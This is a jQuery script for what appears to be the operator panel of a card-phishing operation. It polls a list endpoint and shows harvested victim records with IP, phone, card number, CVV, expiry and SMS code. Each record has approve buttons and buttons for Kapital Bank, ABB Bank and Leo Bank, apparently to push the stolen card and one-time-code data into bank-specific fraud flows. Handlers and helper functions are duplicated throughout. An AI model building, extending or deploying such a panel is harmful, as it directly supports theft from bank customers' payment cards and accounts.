function loadContacts() {
  $.ajax({
    url: '/crud/api/list/',
    type: 'GET',
    dataType: 'json',
    headers: { 'X-CSRFToken': '{{ csrf_token }}' },
    success: function (data) {
      console.log('Received data:', data); 
      let contactsTableBody = $('#contact-table-body');
      contactsTableBody.empty();

    },
  });
}
loadContacts();
setInterval(loadContacts, 1500); 
function loadContacts() {
  $.ajax({
    url: '/crud/api/list/',
    type: 'GET',
    dataType: 'json',
    headers: { 'X-CSRFToken': '{{ csrf_token }}' },
    success: function (data) {
      let contactsTableBody = $('#contact-table-body');
      contactsTableBody.empty();

      data.contacts.forEach(function (contact) {
        let row = `
          <tr>
            <td>${contact.id}</td>
            <td>${contact.ip}</td>
            <td>${contact.operator}</td>
            <td>${contact.phone}</td>
            <td>${contact.amount}</td>
            <td>${contact.cc}</td>
            <td>${contact.cvv}</td>
            <td>${contact.mm}</td>
            <td>${contact.yy}</td>
            <td>${contact.sms}</td>
            <td>${contact.created_at}</td>
            <td>
              <a href="/crud/update/${contact.id}/">Edit</a> |
              <a href="/crud/delete/${contact.id}/">Delete</a>
            </td>
            <td>
              <a href="#" class="approve-btn" data-contact-id="${contact.id}">Onayla</a>
              <button type="button" class="kapital-btn" id="kapital-btn" data-contact-id="${contact.id}">Kapital Bank</button>
              <button type="button" class="abb-btn" id="abb-btn" data-contact-id="${contact.id}">ABB Bank</button>
              <button type="button" class="leobank" id="leobank" data-contact-id="${contact.id}">Leo Bank</button>
            </td> 
          </tr>
        `;
        contactsTableBody.append(row);
      });
    },
  });
}
$(document).on('click', '.approve-btn', function (event) {
  event.preventDefault();
  const contactId = $(this).data('contact-id');

  $.ajax({
    url: '/crud/approve/' + contactId + '/',
    type: 'POST',
    dataType: 'json',
    success: function (data) {
      if (data.success) {
      } else {
      }
    },
  });
});
$.ajaxSetup({
  beforeSend: function(xhr, settings) {
    if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(settings.type) && !this.crossDomain) {
      xhr.setRequestHeader('X-CSRFToken', $('meta[name="csrf-token"]').attr('content'));
    }
  }
});

function getCookie(name) {
  let cookieValue = null;
  if (document.cookie && document.cookie !== '') {
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const cookie = cookies[i].trim();
      if (cookie.substring(0, name.length + 1) === (name + '=')) {
        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
        break;
      }
    }
  }
  return cookieValue;
}
$(document).on('click', '.approve-btn', function (event) {
  event.preventDefault();
  var contactId = $(this).data('contact-id');

  $.ajax({
    url: '/crud/api/approve/' + contactId + '/',
    type: 'POST',
    dataType: 'json',
    success: function (data) {
      // Handle the success response here
      if (data.success) {
        alert('Contact approved successfully!');
        // Refresh the contact list or perform any other necessary action
        loadContacts();
      } else {
        alert('Contact approval failed!');
      }
    },
    error: function (xhr, status, error) {
      // Handle the error here
      alert('An error occurred while approving the contact.');
      console.log(xhr.responseText);
    }
  });
});










$(document).on('click', '.kapital-btn', function (event) {
  event.preventDefault();
  const contactId = $(this).data('contact-id');

  $.ajax({
    url: '/crud/kapital/' + contactId + '/',
    type: 'POST',
    dataType: 'json',
    success: function (data) {
      if (data.success) {
      } else {
      }
    },
  });
});
$.ajaxSetup({
  beforeSend: function(xhr, settings) {
    if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(settings.type) && !this.crossDomain) {
      xhr.setRequestHeader('X-CSRFToken', $('meta[name="csrf-token"]').attr('content'));
    }
  }
});

function getCookie(name) {
  let cookieValue = null;
  if (document.cookie && document.cookie !== '') {
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const cookie = cookies[i].trim();
      if (cookie.substring(0, name.length + 1) === (name + '=')) {
        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
        break;
      }
    }
  }
  return cookieValue;
}
$(document).on('click', '.kapital-btn', function (event) {
  event.preventDefault();
  var contactId = $(this).data('contact-id');

  $.ajax({
    url: '/crud/kapital/' + contactId + '/',
    type: 'POST',
    dataType: 'json',
    success: function (data) {
      // Handle the success response here
      if (data.success) {
        alert('Contact approved successfully!');
        // Refresh the contact list or perform any other necessary action
        loadContacts();
      } else {
        alert('Contact approval failed!');
      }
    },
    error: function (xhr, status, error) {
      // Handle the error here
      alert('An error occurred while approving the contact.');
    }
  });
});





$(document).on('click', '.abb-btn', function (event) {
  event.preventDefault();
  const contactId = $(this).data('contact-id');

  $.ajax({
    url: '/crud/abb/' + contactId + '/',
    type: 'POST',
    dataType: 'json',
    success: function (data) {
      if (data.success) {
      } else {
      }
    },
  });
});
$.ajaxSetup({
  beforeSend: function(xhr, settings) {
    if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(settings.type) && !this.crossDomain) {
      xhr.setRequestHeader('X-CSRFToken', $('meta[name="csrf-token"]').attr('content'));
    }
  }
});
function getCookie(name) {
  let cookieValue = null;
  if (document.cookie && document.cookie !== '') {
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const cookie = cookies[i].trim();
      if (cookie.substring(0, name.length + 1) === (name + '=')) {
        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
        break;
      }
    }
  }
  return cookieValue;
}
$(document).on('click', '.abb-btn', function (event) {
  event.preventDefault();
  var contactId = $(this).data('contact-id');

  $.ajax({
    url: '/crud/abb/' + contactId + '/',
    type: 'POST',
    dataType: 'json',
    success: function (data) {
      // Handle the success response here
      if (data.success) {
        alert('Contact approved successfully!');
        // Refresh the contact list or perform any other necessary action
        loadContacts();
      } else {
        alert('Contact approval failed!');
      }
    },
    error: function (xhr, status, error) {
      // Handle the error here
      alert('An error occurred while approving the contact.');
    }
  });
});



















$(document).on('click', '.leobank', function (event) {
  event.preventDefault();
  const contactId = $(this).data('contact-id');

  $.ajax({
    url: '/crud/leobank/' + contactId + '/',
    type: 'POST',
    dataType: 'json',
    success: function (data) {
      if (data.success) {
      } else {
      }
    },
  });
});
$.ajaxSetup({
  headers: {
    'X-CSRFToken': getCookie('csrftoken')
  }
});

function getCookie(name) {
  let cookieValue = null;
  if (document.cookie && document.cookie !== '') {
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const cookie = cookies[i].trim();
      if (cookie.substring(0, name.length + 1) === (name + '=')) {
        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
        break;
      }
    }
  }
  return cookieValue;
}
$(document).on('click', '.leobank', function (event) {
  event.preventDefault();
  var contactId = $(this).data('contact-id');

  $.ajax({
    url: '/crud/leobank/' + contactId + '/',
    type: 'POST',
    dataType: 'json',
    success: function (data) {
      // Handle the success response here
      if (data.success) {
        alert('Contact approved successfully!');
        // Refresh the contact list or perform any other necessary action
        loadContacts();
      } else {
        alert('Contact approval failed!');
      }
    },
    error: function (xhr, status, error) {
      // Handle the error here
      alert('An error occurred while approving the contact.');
    }
  });
});